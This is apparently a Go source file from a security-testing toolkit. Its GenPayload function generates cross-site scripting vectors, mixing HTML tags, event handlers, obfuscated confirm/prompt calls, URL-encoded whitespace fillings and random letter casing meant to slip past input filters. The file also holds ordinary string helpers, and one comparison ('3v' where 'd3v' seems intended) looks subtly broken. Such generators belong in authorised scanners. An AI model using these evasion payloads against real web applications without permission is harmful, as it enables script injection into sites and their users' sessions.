package xhtml

import (
	"math/rand"
	"regexp"
	"strings"
	"time"
	"unsafe"

	"github.com/yaklang/yaklang/common/utils"
)

var (
	fillings      = []string{"%09", "%0a", "%0d", "/+/"}
	eventHandlers = map[string][]string{
		"ontoggle": {"details"}, "onpointerenter": {"d3v", "details", "html", "a"},
		"onmouseover": {"a", "html", "d3v"},
	}
)

var (
	functions = []string{"[8].find(confirm)", "confirm()", "(confirm)()", "co\u006efir\u006d()", "(prompt)``", "a=prompt,a()"}
	eFillings = []string{"%09", "%0a", "%0d", "+"}
	lFillings = []string{"", "%0dx"}
	tags      = []string{"html", "d3v", "a", "details"}
	jFillings = []string{";"}
)

func RandSafeString(n int) string {
	return RandStrFromCharSet("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890", n)
}

func RandStrFromCharSet(charSet string, n int) string {
	const (
		// 6 bits to represent a letter index
		letterIdBits = 6
		// All 1-bits as many as letterIdBits
		letterIdMask = 1<<letterIdBits - 1
		letterIdMax  = 63 / letterIdBits
	)
	// const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
	src := rand.NewSource(time.Now().UnixNano())
	b := make([]byte, n)
	// A rand.Int63() generates 63 random bits, enough for letterIdMax letters!
	for i, cache, remain := n-1, src.Int63(), letterIdMax; i >= 0; {
		if remain == 0 {
			cache, remain = src.Int63(), letterIdMax
		}
		if idx := int(cache & letterIdMask); idx < len(charSet) {
			b[i] = charSet[idx]
			i--
		}
		cache >>= letterIdBits
		remain--
	}
	return *(*string)(unsafe.Pointer(&b))
}

func IsEscaped(s string) bool {
	re, _ := regexp.Compile("\\*")

	res := re.FindAllString(s, -1)
	l := len(res)
	if l == 0 {
		return false
	} else if l%2 == 0 {
		return false
	} else if l%2 == 1 {
		return true
	} else {
		return false
	}
}

func AddElement2Set(arr *[]string, e string) {
	if !utils.StringArrayContains(*arr, e) {
		*arr = append(*arr, e)
	}
}

// MatchBetween 从字符串中匹配两个字符串之间的内容，最多匹配 n 个字符，n 为 -1 时不限制
// 返回匹配到的内容的起始位置与匹配到的内容
// Example:
// ```
// xhtml.MatchBetween("123456789", "2", "6", -1) // 2, "345"
// ```
func MatchBetween(srcBody interface{}, start string, end string, n int) (int, string) {
	src := utils.InterfaceToString(srcBody)
	srcFIndex := src
	i1 := strings.Index(srcFIndex, start)
	if i1 == -1 {
		return -1, ""
	}
	i1 += len(start)
	i2 := strings.Index(srcFIndex[i1:], end)
	if i2 == -1 {
		return -1, ""
	}
	i2 += i1

	if (n > 0 && i2-i1-1 <= n) || n <= 0 {
		return i1, src[i1:i2]
	} else {
		return -1, ""
	}
}

// RandomUpperAndLower 返回一个随机大小写的字符串
// Example:
// ```
// xhtml.RandomUpperAndLower("target") // TArGeT
// ```
func RandomUpperAndLower(s string) string {
	last := _RandomUpperAndLower(s)
	count := 0
	for last == s && count < 10 {
		last = _RandomUpperAndLower(s)
		count++
	}
	return last
}

func _RandomUpperAndLower(s string) string {
	bs := []byte(s)
	for i := 0; i < len(bs); i++ {
		if bs[i] >= 'a' && bs[i] <= 'z' {
			if rand.Intn(2) == 1 {
				bs[i] -= uint8(uint8('a') - uint8('A'))
			}
		} else if bs[i] >= 'A' && bs[i] <= 'Z' {
			if rand.Intn(2) == 1 {
				bs[i] += uint8(uint8('a') - uint8('A'))
			}
		}
	}
	return string(bs)
}

func GenPayload(testStr string, ends []string) []string {
	var bait string
	vectors := []string{}

	for _, tag := range tags {
		if tag == "d3v" || tag == "a" {
			bait = testStr
		} else {
			bait = ""
		}
		for eventHandlerKey, eventHandler := range eventHandlers {
			for _, handlerTag := range eventHandler {
				for _, function := range functions {
					for _, filling := range fillings {
						for _, eFilling := range eFillings {
							for _, lFilling := range lFillings {
								for _, end := range ends {
									if handlerTag == "3v" || handlerTag == "a" {
										if utils.StringArrayContains(ends, ">") {
											end = ">"
										}

										vector := "<" + RandomUpperAndLower(tag) + filling + RandomUpperAndLower(eventHandlerKey) + eFilling + "=" + eFilling + function + lFilling + end + bait
										vectors = append(vectors, vector)
									}
								}
							}
						}
					}
				}
			}
		}

	}
	return vectors
}
